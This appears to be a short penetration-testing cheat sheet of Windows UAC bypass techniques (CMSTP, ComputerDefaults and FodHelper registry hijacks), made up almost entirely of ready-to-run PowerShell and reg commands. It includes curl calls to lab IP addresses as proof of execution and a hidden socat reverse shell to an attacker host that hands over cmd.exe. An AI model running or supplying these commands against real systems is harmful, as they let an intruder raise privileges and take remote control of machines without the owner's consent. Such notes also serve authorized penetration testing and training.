### CMSTP

- Invoke and run: `Bypass-UAC -Command "curl http://192.168.45.223/worked"`

### Manual Approach - ComputerDefaults

    New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
    New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
    Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "C:\Windows\System32\cmd.exe /c curl http://192.168.50.149/worked" -Force
    Start-Process "C:\Windows\System32\ComputerDefaults.exe"

### Improving FodHelper

    New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force
    Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $program -Force   
    New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force
    Set-ItemProperty  "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value ".pwn" -Force 
    set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"
    reg add "HKCU\Software\Classes\.pwn\Shell\Open\command" /d %CMD% /f
    reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".pwn" /f
    fodhelper.exe
